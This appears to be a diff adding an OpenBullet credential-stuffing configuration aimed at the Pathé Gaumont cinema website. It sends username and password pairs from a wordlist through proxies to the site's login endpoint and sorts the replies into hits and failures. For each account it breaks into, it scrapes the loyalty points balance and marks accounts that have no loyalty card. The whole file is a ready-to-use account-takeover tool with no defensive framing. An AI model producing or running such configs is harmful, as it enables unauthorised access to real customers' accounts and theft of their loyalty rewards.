@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Gaumont",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-09T17:44:45.5850197+00:00",
+  "AdditionalInfo": "",
+  "Author": "Meyer",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.cinemaspathegaumont.com/index.php?do=ajax_check_auth_faq" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&mdp=<PASS>&pass=2&connect=1&actif=2&geterrorstring=1&response=undefined" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.cinemaspathegaumont.com/contact.html" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Email ou mot de passe incorrect" 
+    KEY "{\"ok\":0" 
+  KEYCHAIN Success OR 
+    KEY "{\"ok\":1" 
+REQUEST GET "https://www.cinemaspathegaumont.com/mon-compte.html" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<div class=\"points\">" "</div>" Recursive=FALSE -> CAP "POINTS" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Vous n'avez pas de carte de Fidélité" 
